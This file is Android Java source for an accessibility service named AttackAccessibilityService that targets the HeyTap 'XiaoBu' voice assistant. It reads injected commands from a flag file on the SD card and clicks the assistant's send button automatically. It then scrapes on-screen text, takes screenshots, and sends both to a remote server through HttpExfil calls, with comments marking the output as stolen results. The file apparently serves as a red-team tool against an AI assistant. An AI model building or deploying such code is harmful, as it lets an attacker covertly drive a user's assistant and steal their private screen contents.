package com.attacker.xiaobu;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.graphics.Bitmap;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;

/**
 * v39 — 极简稳定版 + 连续攻击修复
 * 流程: 检测flag文件 → 2s后点发送 → 5s后读UI+截图 → 保存 → 检查下一个flag
 */
public class AttackAccessibilityService extends AccessibilityService {
    private static final String TAG = "XiaoBuAttack";
    private static final String XB = "com.heytap.speechassist";
    private final Handler h = new Handler(Looper.getMainLooper());
    private boolean busy = false;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 200;
        setServiceInfo(info);
        // 主动轮询: 每2秒检查flag文件, 不依赖无障碍事件触发
        startPolling();
        Log.i(TAG, "🔧 v39 ready");
    }

    private void startPolling() {
        h.postDelayed(() -> {
            tryStart();
            startPolling();  // 持续轮询
        }, 1500);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // 事件触发也作为补充
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
        if (XB.equals(pkg) && !busy) tryStart();
    }

    private void tryStart() {
        try {
            java.io.File f = new java.io.File("/sdcard/attack_payload.txt");
            if (!f.exists()) return;
            java.io.FileInputStream fis = new java.io.FileInputStream(f);
            byte[] d = new byte[fis.available()]; fis.read(d); fis.close();
            String p = new String(d, "UTF-8").trim();
            if (p.isEmpty()) return;
            f.delete();
            Log.i(TAG, "🔍 " + p);
            busy = true;
            final String cmd = p;

            h.postDelayed(() -> {
                clickSend();
                h.postDelayed(() -> {
                    captureAll(cmd);
                    busy = false;
                }, 5000);
            }, 2000);
        } catch (Exception e) {}
    }

    private void clickSend() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        List<AccessibilityNodeInfo> btns = root.findAccessibilityNodeInfosByViewId(XB + ":id/btn_send");
        if (btns != null && !btns.isEmpty()) {
            btns.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
            Log.i(TAG, "✅ click");
        }
        root.recycle();
    }

    private void captureAll(String payload) {
        StringBuilder sb = new StringBuilder();
        sb.append("=== 窃取结果 ===\n载荷: ").append(payload).append("\n");
        sb.append("时间: ").append(new java.util.Date()).append("\n\n");

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) {
            String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "?";
            sb.append("当前App: ").append(pkg).append("\n");
            List<String> texts = new ArrayList<>();
            extractTexts(root, texts);
            for (int i = 0; i < texts.size(); i++) {
                String t = texts.get(i);
                if (t.length() > 300) t = t.substring(0, 300) + "...";
                sb.append("[").append(i).append("] ").append(t).append("\n");
            }
            sb.append("\n共").append(texts.size()).append("条\n");
            root.recycle();
        }

        // 截图
        String picPath = "/sdcard/attacker_screen_" + System.currentTimeMillis() + ".png";
        try {
            takeScreenshot(android.view.Display.DEFAULT_DISPLAY, Executors.newSingleThreadExecutor(),
                new TakeScreenshotCallback() {
                    public void onSuccess(ScreenshotResult r) {
                        try {
                            Bitmap b = Bitmap.wrapHardwareBuffer(r.getHardwareBuffer(), r.getColorSpace());
                            if (b != null) {
                                FileOutputStream o = new FileOutputStream(picPath);
                                b.compress(Bitmap.CompressFormat.PNG, 100, o); o.close();
                                b.recycle(); r.getHardwareBuffer().close();
                                sb.append("\n📸: ").append(picPath).append(" (").append(new java.io.File(picPath).length()).append("B)\n");
                                // 外泄截图到远程服务器
                                HttpExfil.sendScreenshot(AttackAccessibilityService.this, payload, picPath);
                            }
                        } catch (Exception e) {}
                    }
                    public void onFailure(int c) {}
                });
        } catch (Exception e) {}

        sb.append("\n✓\n");
        String summary = sb.toString();
        rotateFiles("/sdcard/attacker_output_", ".txt", summary);

        // 外泄到远程服务器
        HttpExfil.sendText(this, payload, summary);

        Log.i(TAG, "🎉");
    }

    private void rotateFiles(String prefix, String suffix, String content) {
        try {
            new java.io.File(prefix + "2" + suffix).delete();
            new java.io.File(prefix + "1" + suffix).renameTo(new java.io.File(prefix + "2" + suffix));
            new java.io.File(prefix + "0" + suffix).renameTo(new java.io.File(prefix + "1" + suffix));
            FileOutputStream o = new FileOutputStream(prefix + "0" + suffix);
            o.write(content.getBytes("UTF-8")); o.close();
            FileOutputStream o2 = new FileOutputStream(prefix.replace("_", "") + suffix);
            o2.write(content.getBytes("UTF-8")); o2.close();
        } catch (Exception e) {}
    }

    private void extractTexts(AccessibilityNodeInfo n, List<String> o) {
        if (n == null || o.size() > 80) return;
        try {
            CharSequence t = n.getText();
            if (t != null && t.length() > 1 && t.length() < 500) o.add(t.toString().trim());
            CharSequence d = n.getContentDescription();
            if (d != null && d.length() > 1 && d.length() < 100) o.add("[desc] " + d.toString().trim());
            for (int i = 0; i < n.getChildCount(); i++) {
                AccessibilityNodeInfo c = n.getChild(i);
                if (c != null) { extractTexts(c, o); c.recycle(); }
            }
        } catch (Exception e) {}
    }

    @Override public void onInterrupt() {}
}
